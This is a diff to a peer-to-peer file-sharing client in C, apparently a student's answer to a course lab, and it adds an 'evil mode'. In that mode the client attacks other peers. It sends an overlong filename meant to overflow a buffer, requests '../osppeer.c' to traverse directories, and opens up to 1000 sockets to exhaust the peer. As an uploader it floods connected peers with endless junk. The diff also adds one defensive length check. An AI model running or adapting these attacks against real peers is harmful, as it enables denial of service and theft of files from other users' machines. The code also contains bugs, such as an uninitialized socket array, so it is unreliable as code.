@@ -643,6 +643,93 @@ static void task_download(task_t *t, task_t *tracker_task)
 	task_download(t, tracker_task);
 }
 
+// For when in evil mode
+static void task_evil_download(task_t *t, task_t *tracker_task)
+{
+	int i, ret = -1;
+	assert((!t || t->type == TASK_DOWNLOAD)
+	       && tracker_task->type == TASK_TRACKER);
+
+	// Quit if no peers, and skip this peer
+	if (!t || !t->peer_list) {
+		error("* No peers to be victims for '%s'\n",
+		      (t ? t->filename : "that file"));
+		task_free(t);
+		return;
+	} else if (t->peer_list->addr.s_addr == listen_addr.s_addr
+		   && t->peer_list->port == listen_port)
+		goto try_again;
+
+	// Connect to the peer and write the GET command
+	message("* Connecting to %s:%d to attack '%s'\n",
+		inet_ntoa(t->peer_list->addr), t->peer_list->port,
+		t->filename);
+	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+	if (t->peer_fd == -1) {
+		error("* Cannot connect to peer: %s\n", strerror(errno));
+		goto try_again;
+	}
+	
+	int ids[1000];
+	int socket_num = 0;
+	// First attempt getting some bad files
+	ids[0] = t->peer_fd;
+	// Put in a filename that's very long and not null terminated
+	strncpy(t->filename, t->disk_filename, FILENAMESIZ - 1);
+	// Then put that filename 4 times, so it's over FILENAMESIZ and not null terminated
+	message("* Asking for very large filename\n");
+	osp2p_writef(t->peer_fd, "GET %s%s%s%s OSP2P\n", 
+		t->filename, t->filename, t->filename, t->filename);
+		
+	// Attempt a new connection to them while we let them handle that request
+	// to do more
+	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+	if (t->peer_fd == -1) {
+		error("* Cannot connect to peer: %s\n", strerror(errno));
+		goto try_again;
+	}
+	ids[1]  = t->peer_fd;
+	// Get some higher level files, perhaps their peer code, just if we can
+	osp2p_writef(t->peer_fd, "GET ../osppeer.c OSP2P\n");
+	
+	// Request from them the same valid file a lot of times, but ignore them
+	// until they refuse us
+	socket_num = 2;
+	for(; socket_num < 1000; socket_num++)
+	{
+		ids[socket_num] = open_socket(t->peer_list->addr, t->peer_list->port);
+		if (ids[socket_num]  == -1) {
+			error("* Peer refused our socket :[ : %s\n", strerror(errno));
+			goto try_again;
+		}
+		osp2p_writef(t->peer_fd, "GET cat1.jpg OSP2P\n");
+	}
+	// No need to open disk file for the result, we don't want to
+	// actually download anything
+	
+	// Read the file into the task buffer from the peer, just till
+	// it fills up
+	while (1) {
+		int ret = read_to_taskbuf(t->peer_fd, t);
+		if (ret == TBUF_ERROR) {
+			error("* Peer read error");
+			goto try_again;
+		} else if (ret == TBUF_END && t->head == t->tail)
+			/* End of file */
+			break;
+	}
+	
+	// We want to try to harm someone else no matter what
+    try_again:
+	message("* Closing connection to attacked peer\n");
+	for(i = 0; i < 1000; i++)
+		if(ids[i] >= 0)
+			close(ids[i]);
+	// recursive call
+	task_pop_peer(t);
+	task_evil_download(t, tracker_task);
+}
+
 
 // task_listen(listen_task)
 //	Accepts a connection from some other peer.
@@ -689,7 +776,19 @@ static void task_upload(task_t *t)
 			   || (t->tail && t->buf[t->tail-1] == '\n'))
 			break;
 	}
-
+	
+	// EXERCISE 2B: BLOCK ACCESS TO OTHER DIRECTORIES
+	// First, make sure that the filename is not too long, allow
+	// space for the GET, OSP2P and spaces before and after
+	// the filename
+	if(strlen(t->buf) > FILENAMESIZ + 12)
+	{
+		error("ERROR: Possible Attack Detected!\n");
+		error("ERROR: Peer passed a filename that is too long\n");
+		error("ERROR: ENDING UPLOAD INSTANCE\n");
+		goto exit;
+	}
+	
 	assert(t->head == 0);
 	if (osp2p_snscanf(t->buf, t->tail, "GET %s OSP2P\n", t->filename) < 0) {
 		error("* Odd request %.*s\n", t->tail, t->buf);
@@ -722,29 +821,37 @@ static void task_upload(task_t *t)
 		}
 	}
 
-	
-	t->disk_fd = open(t->filename, O_RDONLY);
-	if (t->disk_fd == -1) {
-		error("* Cannot open file %s", t->filename);
-		goto exit;
-	}
-
-	message("* Transferring file %s\n", t->filename);
-	// Now, read file from disk and write it to the requesting peer.
-	while (1) {
-		int ret = write_from_taskbuf(t->peer_fd, t);
-		if (ret == TBUF_ERROR) {
-			error("* Peer write error");
+	if(evil_mode ==0)
+	{
+		t->disk_fd = open(t->filename, O_RDONLY);
+		if (t->disk_fd == -1) {
+			error("* Cannot open file %s", t->filename);
 			goto exit;
 		}
 
-		ret = read_to_taskbuf(t->disk_fd, t);
-		if (ret == TBUF_ERROR) {
-			error("* Disk read error");
-			goto exit;
-		} else if (ret == TBUF_END && t->head == t->tail)
-			/* End of file */
-			break;
+		message("* Transferring file %s\n", t->filename);
+		// Now, read file from disk and write it to the requesting peer.
+		while (1) {
+			int ret = write_from_taskbuf(t->peer_fd, t);
+			if (ret == TBUF_ERROR) {
+				error("* Peer write error");
+				goto exit;
+			}
+
+			ret = read_to_taskbuf(t->disk_fd, t);
+			if (ret == TBUF_ERROR) {
+				error("* Disk read error");
+				goto exit;
+			} else if (ret == TBUF_END && t->head == t->tail)
+				/* End of file */
+				break;
+		}
+	}
+	else if (evil_mode != 0)
+	{
+		while (1) {
+			osp2p_writef(t->peer_fd, "CatsAreGreat");
+		}
 	}
 
 	message("* Upload of %s complete\n", t->filename);
@@ -862,6 +969,32 @@ int main(int argc, char *argv[])
 		}
 	}
 	
+	// Now attempt some evil downloads if in evil mode
+	if(evil_mode != 0)
+	{
+		argv--;
+		strcpy(argv[1], "cat1.jpg");
+		if ((t = start_download(tracker_task, argv[1])))
+		{
+			// Fork the process!
+			pid = fork();
+			
+			// If we failed to fork, error out
+			if(pid == -1)
+				error("UNABLE TO FORK FOR DOWNLOADS\n");
+
+			// If we are the parent, we want to just keep going
+			else if(pid > 0)
+			{			}
+				
+			// If we are the child, we perform the download, then exit
+			else if(pid == 0)
+			{
+				task_evil_download(t, tracker_task);
+				_exit(0);
+			}
+		}
+	}
 
 	// Then accept connections from other peers and upload files to them!
 	// EXERCISE 1B: PARALLEL UPLOADS
